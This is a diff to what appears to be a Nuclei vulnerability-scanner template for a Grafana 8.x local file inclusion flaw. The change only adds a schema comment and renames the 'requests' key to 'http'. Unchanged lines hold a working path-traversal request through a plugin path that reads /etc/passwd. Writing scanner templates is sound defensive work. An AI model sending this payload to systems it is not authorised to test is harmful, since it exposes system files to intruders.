@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: grafana-file-read
 info:
   name: Grafana 8.x - Local File Inclusion
@@ -16,7 +17,7 @@ info:
     cvss-score: 7.5
     cwe-id: CWE-22
   tags: grafana,lfi,fuzz
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/public/plugins/{{pluginSlug}}/../../../../../../../../../../../../../../../../../../../etc/passwd"
